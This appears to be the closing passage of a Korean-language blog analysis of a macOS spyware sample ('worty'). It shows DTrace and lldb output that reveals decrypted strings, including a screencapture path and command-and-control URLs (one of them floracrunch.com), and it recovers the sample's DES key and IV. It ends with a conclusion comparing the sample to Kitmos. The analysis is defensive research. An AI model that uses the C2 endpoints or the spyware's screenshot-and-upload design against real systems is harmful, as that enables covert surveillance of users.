1 1 1 key:60002e4f49b0 size:8 iv:7fff5fbfe7f0 datainput:60005605d710, dataoutput:7fff5fbfe800(yy-MM-dd-HH:mm:ss?_?)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x0000000100001774+0x119
              worty`0x000000010000137b+0x4e
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121
              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3
1 1 1 key:60002e6e1fb0 size:8 iv:7fff5fbfe7f0 datainput:600016c348b0, dataoutput:7fff5fbfe800(.pngM-dd-HH:mm:ss?_?)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x0000000100001774+0x150
              worty`0x000000010000137b+0x4e
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121
              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3
1 1 1 key:60002e6e1f30 size:8 iv:7fff5fbfe7f0 datainput:600055e44870, dataoutput:7fff5fbfe800(/usr/sbin/screencapture)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x0000000100001774+0x1b6
              worty`0x000000010000137b+0x4e
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121
              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3
(/tmp)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x0000000100001774+0x29
              worty`0x000000010000137b+0x4e
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121
              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3
1 1 1 key:60802f4e8330 size:8 iv:7fff5fbfe680 datainput:60802f87e050, dataoutput:7fff5fbfe690(hxxp://fxxxxxxxxxx.com/doxc/aqw.php?yin=%@3??)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x00000001000019c6+0x185
              worty`0x0000000100001774+0x23a
              worty`0x000000010000137b+0x4e
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121</pre>
<p>모든 복호화된 문자열을 획득하였으며, 각 암호문과 매핑하여 빠르게 분석을 진행할 수 있다. 복호화를 위한 키 추출은 위에서 설명한 lldb와 DTrace를 이용하여 찾을 수 있다.</p>
<pre class="lang:sh decode:true " title="Find the masterkey">// lldb - set BreakPoint at CCCrypt
(lldb) b 0x100002750
Breakpoint 1: where = worty`___lldb_unnamed_function21$$worty + 216, address = 0x0000000100002750
(lldb) c
Process 976 resuming

// DTRACE
1 1 1 key:100233380 size:8 iv:7fff5fbfe710 datainput:100271160, dataoutput:7fff5fbfe720(http://floracrunch.com)

              libcommonCrypto.dylib`CCCrypt+0xcd
              worty`0x0000000100002678+0xdd
              worty`0x0000000100001ee4+0x21
              worty`0x00000001000013cb+0x23
              worty`0x000000010000137b+0x34
              CoreFoundation`__CFNOTIFICATIONCENTER_IS_CALLING_OUT_TO_AN_OBSERVER__+0xc
              CoreFoundation`_CFXNotificationPost+0xb4d
              Foundation`-[NSNotificationCenter postNotificationName:object:userInfo:]+0x44
              AppKit`-[NSApplication _postDidFinishNotification]+0x121
              AppKit`-[NSApplication _sendFinishLaunchingNotification]+0xc3

// lldb - Find the IV and symmetric key
Process 976 stopped
* thread #1: tid = 0xac8b, 0x0000000100002750 worty`___lldb_unnamed_function21$$worty + 216, queue = 'com.apple.main-thread, stop reason = breakpoint 1.1
    frame #0: 0x0000000100002750 worty`___lldb_unnamed_function21$$worty + 216
worty`___lldb_unnamed_function21$$worty + 216:
-&gt; 0x100002750:  callq  0x1000030c8               ; symbol stub for: CCCrypt
   0x100002755:  movl   %eax, %ecx
   0x100002757:  xorl   %eax, %eax
   0x100002759:  testl  %ecx, %ecx
(lldb) x/8xb 7fff5fbfe710 // IV
0x7fff5fbfe710: 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08
(lldb) x/8xb 0x100233380 // decryption key
0x100233380: 0xc2 0xb6 0xc2 0xb6 0xc2 0xb6 0xc2 0xb6
(lldb)</pre>
<p>IV는 위에서 분석한 값과 동일하며, 키는 0xb6c2b6c2b6c2b6c2 인 것을 확인할 수 있다.</p>
<p>&nbsp;</p>
<h2>8. 결론</h2>
<p>이 악성코드는 과거에 발견되었던 <a href="http%3A%2F%2Fwww.f-secure.com%2Fweblog%2Farchives%2F00002554.html&amp;h=AAQEiitRp" target="_blank">Kitmos</a>와 거의 동일한 기능을 수행하나, 자기 자신의 주요 정보를 숨기는 등 좀 더 고도화된 모습을 보여준다. 이 악성코드는 최초 획득한 URL에 있는 데이터와 악성코드가 생성하는 폴더 정보를 보면, 중국 쪽에서 개발된 것으로 추정된다. 과거에 Tibet과의 분쟁으로 한창 티벳을 대상으로 하는 악성코드가 발견되었지만, 최근에는 사람들에게 안전하다고 각인되어 있는 Mac OS X를 대상으로 공격을 진행하는 사례가 늘어나고 있다. 특히 Mac OS X의 악성코드의 개발 의도를 보면, 윈도우 악성코드처럼 돈을 벌기 위한 수단이라기 보다는 정치적인 성향을 많이 띄고 있으며, 국가간 분쟁 지역을 향한 공격이 많이 행해지고 있다. 사용자가 신뢰하는 앱스토어를 통해 유포하는 것은 기본이고, 애플리케이션의 확장자 변조로 실행 파일을 문서화일로 보이게 만드는 것도 손쉽기 때문에 앞으로도 많은 악성코드가 개발되어 질 것이라 생각한다.</p>
<p>국가 또는 조직 내에서 특정 운영체제의 점유율이 적다고해서 보안의 테두리에서 제외 시키면, 그로인해 정보가 유출될 수 있으며 보안업체도 이러한 상황을 사전에 준비하지 못하면 이로 인한 침해사고 대응 속도가 떨어질 수 밖에 없음을 인지해야 할 것이다. :-)</p>
<p>&nbsp;</p>
<p>&nbsp;[/fusion_builder_column][/fusion_builder_row][/fusion_builder_container]</p>
